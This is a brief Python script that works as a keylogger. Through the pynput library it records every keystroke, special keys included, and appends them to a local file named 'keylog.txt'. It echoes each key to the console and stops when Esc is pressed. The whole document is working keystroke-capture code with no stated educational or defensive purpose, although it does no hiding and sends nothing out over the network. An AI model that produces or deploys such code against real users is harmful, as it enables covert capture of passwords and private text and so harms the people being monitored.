from pynput.keyboard import Key, Listener

# Define the log file
log_file = "keylog.txt"

def on_press(key):
    """Function to be called when a key is pressed."""
    try:
        # Get the character representation of the key
        char = str(key.char)
    except AttributeError:
        # Handle special keys (e.g., Space, Enter)
        if key == Key.space:
            char = " "
        elif key == Key.enter:
            char = "\n"
        else:
            # For other special keys, use their name
            char = f"[{key.name}]"
    
    # Write the key to the log file
    with open(log_file, "a") as f:
        f.write(char)
        print(f"Logged: {char}")

def on_release(key):
    """Function to be called when a key is released."""
    # Stop the listener when the user presses the 'Esc' key
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()